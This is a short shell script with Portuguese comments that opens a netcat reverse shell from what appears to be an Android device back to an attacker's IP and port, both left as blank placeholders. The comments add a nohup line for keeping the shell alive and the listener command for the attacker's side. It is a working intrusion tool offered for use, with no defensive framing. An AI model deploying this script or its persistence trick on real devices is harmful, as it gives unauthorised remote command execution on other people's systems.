#!/bin/sh
# criacao do reverse shell
# ip_add=${1:-(adb shell ip addr show wlan0 2>/dev/null | grep -oE 'inet [0-9.]+' | grep -oE '[0-9.]+')}
IP=# IP do atacante
PORT=# Porta do atacante

# Estabelecendo a conexão reversa com Netcat e executando o shell
nc $IP $PORT 0<&1 | /bin/sh -i 2>&1 | nc $IP $PORT
# essa conexao nao e interativa mas pode executar um script no dispositivo
# para persistencia minima usar "nohup sh <script> > /dev/null 2>&1 &"
# para escutar usar nc -nvlp <porta do atacante>
